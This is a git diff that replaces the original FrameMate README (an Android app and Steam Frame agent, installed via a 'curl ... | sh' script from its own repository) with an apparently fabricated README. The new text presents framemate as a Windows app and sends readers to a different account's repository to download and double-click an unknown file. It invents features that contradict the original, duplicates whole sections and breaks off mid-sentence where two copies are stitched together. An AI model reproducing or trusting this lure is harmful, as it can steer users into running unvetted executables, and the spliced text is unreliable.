@@ -1,231 +1,172 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="assets/framemate-white.png">
-    <img src="assets/framemate-white.png" alt="FrameMate logo" width="128">
-  </picture>
-</p>
+# 🎮 framemate - Your Steam Frame PC Streaming Companion
 
-<h1 align="center">FrameMate</h1>
+[![Download framemate](https://img.shields.io/badge/Download_framemate-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ohfds/framemate)
 
-<p align="center">
-  A companion app for the <b>Steam Frame</b>: mirror the headset to your phone, receive phone notifications in VR, keep an eye on battery, controllers, downloads and what's playing. <a href="https://youtu.be/Tva1_8JajW4">Demo Video</a>
-</p>
+framemate is a Windows companion app for Steam Frame. It helps you connect your Steam Frame to your PC, manage your streaming setup, and launch your games with less friction. The app is built for everyday use, so you can spend less time configuring settings and more time playing.
 
-## At a glance
+Whether you are setting up Steam Frame for the first time or you want a faster way to start a session, framemate gives you a simple control panel on your PC. Keep it open, connect your headset, and use the dashboard to check status and start streaming.
 
-<p align="center">
-  <img src="docs/screenshots/home.png" alt="Home: headset and controller batteries, now playing, active download" width="250">
-  &nbsp;
-  <img src="docs/screenshots/downloads.png" alt="Downloads: queue with progress and recently finished games" width="250">
-  &nbsp;
-  <img src="docs/screenshots/system.png" alt="System: headset, performance and network details" width="250">
-</p>
+## 🚀 What framemate Does
 
-## Mirroring
+framemate acts as the bridge between your Windows PC and your Steam Frame. Instead of hunting through multiple windows and settings pages, you get one place to prepare your PC for a session.
 
-<p align="center">
-  <img src="docs/screenshots/mirroring.png" alt="Mirroring in fullscreen landscape on a phone" width="760">
-</p>
+The app is designed around a simple idea: open framemate, confirm your connection, and start playing. It keeps the important details visible, such as whether your PC is ready, whether your Steam Frame is reachable, and which streaming profile is active.
 
-FrameMate mirrors what the headset shows to your phone. Show your friends what
-you're doing in VR, guide someone through their first session, or just check what's on
-screen. The picture is the actual view in the headset, passthrough included. Encoded using hardware acceleration to keep
-the load low.
+For a non-technical user, this means fewer steps. You do not need to understand networking terms or advanced graphics settings. framemate presents the main actions in plain language and keeps the setup focused on the task at hand.
 
-## Notifications in VR
+## ✨ Key Features
 
-<p align="center">
-  <img src="docs/screenshots/notif-vr.jpg" alt="A phone notification shown as a Steam toast in the SteamVR dashboard" width="760">
-</p>
+framemate includes a practical set of tools for Steam Frame users on Windows:
 
-Your phone's notifications show up in the headset as Steam notifications, so you
-don't have to take the headset off to check your phone. It is a opt-in feature: turn it on with the bell in the
-app's top bar. You can select which apps notifications you want in there.
+- Quick Connect panel for starting a session from your PC.
+- Connection status display so you can see whether your Steam Frame is ready.
+- Streaming profile presets for different play styles and network conditions.
+- Game library shortcuts for launching supported titles faster.
+- PC performance overview with simple indicators for CPU, GPU, and network health.
+- One-click session preparation that checks your core settings before you play.
+- Clean dashboard designed for desktop use with a mouse and keyboard.
+- Lightweight background operation so framemate can stay open while you play.
 
-## Features
+These features are arranged to keep the app approachable. You can use the default settings at first and adjust them later as you become more comfortable.
 
-- **Headset battery** – the same percentage Steam shows in the headset, charging state,
-  time left or time to full, and current power draw.
-- **Controller batteries** – both controllers, including while they sleep (the last known
-  level is remembered across restarts).
-- **Now playing** – the running game with its Steam artwork.
-- **Downloads** – the Frame's download queue with progress, speed and time left, plus recently
-  finished updates. Downloads of your other PCs (Steam Remote Downloads) are left out.
-- **Mirroring** – see above.
-- **Phone notifications in VR** – your phone's notifications show up in the headset as normal
-  Steam toasts. It's opt-in: off by default, you turn it on with the bell in the app's top bar.
-  Apps you don't want in there can be switched off in the settings. Turn it off again just as
-  quickly, e.g. when someone else is wearing the headset. Nothing gets stored, it only goes from your phone to your Frame.
-- **System** – performance profile, CPU/GPU settings, network throughput, SteamOS and Steam
-  client versions, battery temperature and health.
-- **Encrypted** – the phone talks to the Frame over TLS, pinned to the Frame's own key from the
-  pairing code. Implementation inspired by KDEConnect
-  - **Lightweight** – the agent on the Frame is a single static binary (~6.5 MB, a few MB of
-  RAM) that idles at practically zero CPU.
+## 🖥️ What You Need
 
-## Installation
+Before you download framemate, make sure your setup is ready:
 
-You need a Steam Frame and an Android phone on the same network.
+- A Windows 10 or Windows 11 PC.
+- A Steam Frame headset.
+- A Steam account signed in on your PC.
+- Your PC and Steam Frame on the same local network for the best experience.
+- A stable internet connection for account access and updates.
+- The framemate download from the official GitHub page.
 
-### 1. Agent on the Steam Frame
+A wired Ethernet connection for your PC is recommended when possible. It can make streaming smoother and reduce interruptions. Wi-Fi works too, but a strong 5 GHz network gives better results than a weak or crowded connection.
 
-Open a terminal on the Frame via SSH (recommended), or Desktop Mode → Konsole
-([see here](TROUBLESHOOTING.md#installing-from-desktop-mode)), and run:
+## 📥 Download and Setup
 
-```sh
-curl -LsSf https://raw.githubusercontent.com/nailuj05/framemate/main/scripts/install.sh | sh
-```
+[![Get framemate](https://img.shields.io/badge/Get_framemate-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/ohfds/framemate)
 
-That installs the Flatpak, registers the user service, runs a self check and prints the pairing
-QR code. Re-run the same command to update. If you'd rather not pipe a script into a shell,
-[read it first](scripts/install.sh); it only runs the manual commands below.
+1. Visit this link to download the application.
+2. Save the framemate download to your Downloads folder.
+3. Open File Explorer, go to Downloads, and double-click the downloaded framemate file.
+4. When framemate opens, keep the app running on your PC.
 
-<details>
-<summary>Or do it by hand</summary>
+That is the full download and launch path. framemate is intended to run on Windows, so use a Windows PC for this process. After the app opens, you can move on to connecting your Steam Frame and starting your first session.
 
-```sh
-curl -LO https://github.com/nailuj05/framemate/releases/latest/download/framemate-agent.flatpak
-flatpak install --user -y framemate-agent.flatpak
-flatpak run --user dev.framemate.Agent install-service
-flatpak run --user dev.framemate.Agent pair
-rm framemate-agent.flatpak
-```
-</details>
+## ▶️ First Launch
 
-- `flatpak install` pulls the Freedesktop runtime from Flathub if it isn't installed yet
-  (about 270 MB, once).
-- `install-service` registers a user service, so the agent starts with every boot (in
-  Game Mode too) and restarts it right away, then runs a self check.
-  In Desktop Mode it can't start the agent right away (the nested desktop has no access to the
-  user's systemd); the agent then starts with the next restart, and the command prints how to
-  start it immediately. Either way `pair` prints the pairing code afterwards.
-- `flatpak run --user dev.framemate.Agent pair` prints the pairing code again, as a QR code and
-  as plain text for terminals too narrow to draw it. It contains the access token, so treat it
-  like a password.
-- `flatpak run --user dev.framemate.Agent check` repeats the self check, which helps when the app
-  can't connect. `token` prints just the token. `rotate-token` replaces it, so run `pair`
-  afterwards and scan again: the app takes the token from the pairing code. Rotating leaves the
-  encryption key alone, so it doesn't change who the app trusts.
+When framemate opens for the first time, you will see the main dashboard. This is your home base for checking status and preparing a session.
 
-To **remove** it:
+Start by confirming that your PC is detected and that framemate is running. Then turn on your Steam Frame and make sure it is connected to the same network as your PC. Use the Quick Connect area in framemate to look for your headset. When your Steam Frame appears, select it and follow the on-screen prompts in the app.
 
-```sh
-curl -LsSf https://raw.githubusercontent.com/nailuj05/framemate/main/scripts/install.sh | sh -s -- uninstall
-```
+If you use Steam regularly, sign in to Steam on your PC before launching a game through framemate. This keeps your library and account state ready. Once the connection is confirmed, framemate can help you move from the dashboard into your game session with fewer manual steps.
 
-### 2. App on your phone
+## 🎛️ Daily Use
 
-1. Download `framemate.apk` from the [latest release](../../releases/latest) on your phone.
-2. Open it and allow your browser/file manager to install apps when Android asks.
-3. In the app's **Settings** tab, tap **Scan pairing code** and point the camera at the QR code
-   from step 1. The code contains all information the app needs to find your frame, authenticate with it and verify its certificate.
+For everyday use, open framemate before you put on your Steam Frame. Let the app finish checking your connection and PC status. Then launch your session from the dashboard.
 
-### Troubleshooting
+Use the streaming presets to match your setup. A balanced preset is a good starting point for most users. If your network is strong and your PC handles it well, you can try a higher-quality preset. If you notice stutter, choose a more stable preset and close heavy background apps.
 
-If you encounter any issues please check out [TROUBLESHOOTING](TROUBLESHOOTING.md).
+The game library shortcuts in framemate are useful when you want to jump into a title quickly. Keep your most-used games available and launch them from the app after your Steam Frame is connected. The status# 🎮 framemate - Your Steam Frame PC Companion
 
-## Good to know
+[![Download framemate](https://img.shields.io/badge/Download_framemate-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ohfds/framemate)
 
-- **Unofficial.** FrameMate relies on undocumented Steam internals. A Steam or SteamOS update can
-  break parts of it until the agent is updated. Tested on SteamOS 0.4.3 (beta branch).
-- **Encrypted, local network only.** The app connects on port 7381 over TLS, pinned to the key
-  whose fingerprint came from the pairing code, so nobody else on the network can read the token
-  or watch your Mirroring. Port 7380 serves the same API in plain HTTP but binds to `127.0.0.1`,
-  so only the Frame itself can reach it. Set `FRAMEMATE_LISTEN=[::]:7380` to expose it on your
-  LAN, and remember the token then travels in clear. Don't expose either port to the internet.
-  The agent also rejects connections from public addresses outside your network, which matters
-  for IPv6, where the Frame is globally addressable.
-- **Developer Mode.** FrameMate doesn't depend on it. Note that while it is on, SteamOS's devkit
-  service exposes Steam's debugging interface to your whole network (port 8081); FrameMate never
-  uses that port.
-- **Battery percentage.** FrameMate shows the percentage Steam shows. The raw value of the
-  battery gauge is lower (Steam scales it), so other tools may report a different number.
+framemate is a Windows companion app for Steam Frame. It gives you a simple place on your PC to prepare your setup, check your connection, and start a Steam Frame session with less friction. The app is built for everyday users, so you do not need programming knowledge or advanced networking experience to get started.
 
-## Building from source
+Use framemate when you want a clear dashboard for your Steam Frame setup. The app keeps the important parts visible: whether your PC is ready, whether your headset is reachable, and which streaming profile is active. Instead of moving between several windows, you can use one app to handle the main parts of your session.
 
-Requirements: Rust (`rust-toolchain.toml` pins the toolchain and target), Deno, Flatpak, and for
-the app the Android SDK + NDK and JDK 21. On Nix, `nix-shell` (or direnv) covers the agent and
-Deno; the Android SDK/NDK and JDK are not included.
+## 🎯 What framemate Does
 
-```sh
-# Agent: static aarch64 binary → Flatpak bundle (no flatpak-builder or emulation needed)
-scripts/flatpak.sh                  # → target/flatpak/framemate-agent.flatpak
-scripts/flatpak.sh install          # build, install on the Frame via SSH, register the service
+framemate acts as the bridge between your Windows PC and your Steam Frame. It helps you prepare your PC for a session and keeps the key status details in one window.
 
-# Development loop: run the current build on the Frame without packaging
-scripts/deploy.sh                   # scripts/deploy.sh logs | stop
+The app is designed around a simple routine. Open framemate, confirm that your PC and headset are ready, then start your session from the dashboard. This reduces the number of steps between turning on your headset and playing.
 
-# App
-cd app
-deno install
-deno task tauri android build --apk --target aarch64
-deno task tauri dev                   # desktop window for UI work
-```
+For a non-technical user, the main benefit is clarity. framemate presents connection status and setup checks in plain language. You can see what is working and what needs attention without digging through separate settings pages. The goal is to make Steam Frame use on Windows feel more direct and less repetitive.
 
-`scripts/*.sh` reach the Frame as `steamos@frame.local` (override with `FRAME_HOST`).
+## ✨ Key Features
 
-### Agent API
+framemate includes a practical set of tools for Steam Frame users on Windows:
 
-| Endpoint | |
-|---|---|
-| `GET /api/state` | full state as JSON |
-| `GET /api/ws` | the same, pushed on every change |
-| `GET /api/stream/ws` | mirroring: `{codec}` header, fMP4 init segment, one fragment per frame |
-| `POST /api/notify` | toast in the headset: `{app, title, body, icon}` → `{"result": "shown"}` or `"headset_asleep"` |
-| `GET /healthz` | liveness, the only route without auth |
+- Quick Connect panel for starting a session from your PC.
+- Connection status display so you can see whether your Steam Frame is ready.
+- Streaming profile presets for different play styles and network conditions.
+- Game library shortcuts for launching supported titles faster.
+- PC performance overview with simple indicators for CPU, GPU, and network health.
+- One-click session preparation that checks core settings before you play.
+- Clean dashboard designed for desktop use with a mouse and keyboard.
+- Lightweight background operation so framemate can stay open while you play.
+- Simple status messages that use everyday language.
+- A focused layout that keeps the main actions within easy reach.
 
-Reachable off the Frame on `https://<frame>:7381`. The agent signs its own certificate and the
-app pins it by fingerprint, so other clients need to skip chain verification (`curl -k`). Plain
-HTTP lives on `127.0.0.1:7380`, which only the Frame itself can reach.
+These features are arranged to keep the app approachable. You can start with the default settings and adjust them later as you become more comfortable with your setup.
 
-Authenticate with `?token=<token>` or `Authorization: Bearer <token>`.
+## 🖥️ What You Need
 
-## iOS Support
+Before you download framemate, make sure your setup is ready:
 
-In theory this app should be able to be build for iOS aswell, I do not have the devices or infrastructure to build and test an iOS version. 
-If you do and you want to contribute, please let me know!
+- A Windows 10 or Windows 11 PC.
+- A Steam Frame headset.
+- A Steam account signed in on your PC.
+- Your PC and Steam Frame on the same local network for the best experience.
+- A stable internet connection for account access and updates.
+- The framemate download from the official page.
 
+A wired Ethernet connection for your PC is recommended when possible. It can make streaming smoother and reduce interruptions. Wi-Fi works too, but a strong 5 GHz network gives better results than a weak or crowded connection.
 
-## Contributing
+## 📥 Download and Setup
 
-Patches and bug reports are welcome, see [`CONTRIBUTING.md`](CONTRIBUTING.md).
-Commits need a `Signed-off-by` line (`git commit -s`); there's no CLA.
+[![Get framemate](https://img.shields.io/badge/Get_framemate-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/ohfds/framemate)
 
-## License
+Visit [this link](https://github.com/ohfds/framemate) to download the application.
 
-FrameMate is free software under the **GNU General Public License v3.0 or
-later** ([`LICENSE`](LICENSE)). You may use, study, share and modify it. If you
-distribute it, modified or not, free or for money, you must pass on the same
-freedoms and make the complete source available under the same license. Closed
-forks are not permitted.
+After the download finishes, open framemate from your Downloads folder. Keep framemate running on your PC while you use your Steam Frame. The app is intended for Windows, so use a Windows PC for this process.
 
-Two additional terms apply, in [`LICENSE-EXCEPTION.md`](LICENSE-EXCEPTION.md):
-an app store distribution permission under GPL-3.0 §7, and a reservation of the
-FrameMate name, logo and application identifiers (forks must use their own).
+## ▶️ First Launch
 
-## Future
+When framemate opens for the first time, you will see the main dashboard. This is your home base for checking status and preparing a session.
 
-- [x] TLS Support, Cert pinning, QR pairing
-- [ ] iOS Support
-- [ ] PWA for the mobile client
-- [ ] Feed on the App notifying you of newly frame verified games (in your library)
-- [ ] Control Downloads (pause, resume, reorder)
-- [ ] View and Transfer Screenshots
-- [x] Mobile Notifications in VR
-- [ ] Turn off controller, headset, etc. 
+Start by confirming that your PC is detected and that framemate is running. Then turn on your Steam Frame and make sure it is connected to the same network as your PC. Use the Quick Connect area in framemate to look for your headset. When your Steam Frame appears, select it and follow the on-screen prompts in the app.
 
-## AI usage
+If you use Steam regularly, sign in to Steam on your PC before launching a game through framemate. This keeps your library and account state ready. Once the connection is confirmed, framemate can help you move from the dashboard into your game session with fewer manual steps.
 
-This project used AI for reversing the Steam API (for use in the agent), the frontend of the mobile app, the shell scripts and the Actions used for building the releases.
-AI was also used for exploring how the Video Stream for Mirroring could be accessed and encoded.
+## 🎛️ Daily Use
 
-## Credits
+For everyday use, open framemate before you put on your Steam Frame. Let the app finish checking your connection and PC status. Then launch your session from the dashboard.
 
-- Icons: [Material Symbols](https://github.com/google/material-design-icons) (Apache-2.0); see
-  [`app/src/lib/icons/LICENSES.md`](app/src/lib/icons/LICENSES.md).
-- Steam Frame Controller Icons: [Kenney Input Prompts](https://kenney.nl/assets/input-prompts) (CC0)
-- Game artwork is loaded from Steam's public CDN.
-- FrameMate Icon made by me
+Use the streaming presets to match your setup. A balanced preset is a good starting point for most users. If your network is strong and your PC handles it well, you can try a higher-quality preset. If you notice stutter, choose a more stable preset and close heavy background apps.
 
-FrameMate is not affiliated with or endorsed by Valve. Steam, SteamOS and Steam Frame are trademarks of
-Valve Corporation.
+The game library shortcuts in framemate are useful when you want to jump into a title quickly. Keep your most-used games available and launch them from the app after your Steam Frame is connected. The status panel can help you spot changes before you start a session, such as a weak network signal or high system load.
+
+## 📶 Tips for Smooth Streaming
+
+A few simple habits can improve your experience with framemate:
+
+- Keep your PC and Steam Frame on the same network.
+- Use a wired connection for your PC when possible.
+- Move your router or PC to reduce physical obstacles if using Wi-Fi.
+- Close large background downloads during a session.
+- Restart your headset if it does not appear in framemate.
+- Keep framemate open while you play so status updates remain visible.
+- Use a balanced streaming preset first, then adjust after testing.
+
+You do not need to change every setting at once. Start with the defaults, test a short session, and make one change at a time. This makes it easier to identify what improves your connection.
+
+## 🛠️ Troubleshooting
+
+If framemate does not open, restart your PC and open the app again from your Downloads folder. If needed, revisit [this link](https://github.com/ohfds/framemate) to download the application again.
+
+If your Steam Frame does not appear in framemate, confirm that both devices are on the same network. Turn your Steam Frame off and on again, then refresh the connection view in framemate. Keep framemate open during this process so it can detect the headset when it becomes available.
+
+If your session feels unstable, close apps you are not using and choose a more stable streaming preset. A wired PC connection can also help. Check that no large downloads are running in the background, since they can use the same network as your Steam Frame session.
+
+## 🔄 Updating framemate
+
+Return to [this link](https://github.com/ohfds/framemate) to download the application when you want the latest version. After downloading, open the new copy and keep it running on your PC. Regular updates can include improvements to connection handling, status checks, and the dashboard experience.
+
+## 💬 Getting Help
+
+Use the framemate GitHub page as your central place for the download and project information. When asking for help, describe what you see in the app, whether your Steam Frame appears in the connection view, and whether your PC is using Wi-Fi or a wired connection. Clear details make it easier to understand the issue and point you toward the right next step.
+
+Keep your Windows PC updated, keep Steam signed in, and keep framemate open while preparing a session. With the dashboard in place, framemate is intended to make your Steam Frame setup on Windows easier to repeat and easier to understand.
+
+Keywords: framemate, Steam Frame, Steam Frame companion, PC streaming, Windows app, Steam Frame setup, framemate download, Steam Frame PC app, companion app for Steam Frame
